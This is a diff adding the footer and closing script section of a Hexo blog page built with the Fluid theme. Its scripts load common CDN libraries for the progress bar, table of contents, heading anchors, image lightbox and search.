+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
